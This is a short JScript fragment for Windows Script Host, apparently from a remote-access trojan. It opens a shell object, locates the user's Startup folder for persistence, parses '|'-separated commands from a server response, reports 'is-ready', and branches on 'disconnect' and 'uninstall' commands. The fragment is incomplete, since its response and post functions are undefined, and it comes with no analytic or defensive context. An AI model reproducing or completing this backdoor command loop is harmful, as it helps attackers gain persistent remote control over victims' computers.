var spliter = "|";
var shell = WScript.CreateObject("wscript.shell");
var startup = shell.SpecialFolders("Startup");
var cmd = response.split(spliter);
post("is-ready", "");
switch (cmd[0]) { case "disconnect": break; case "uninstall": break; }
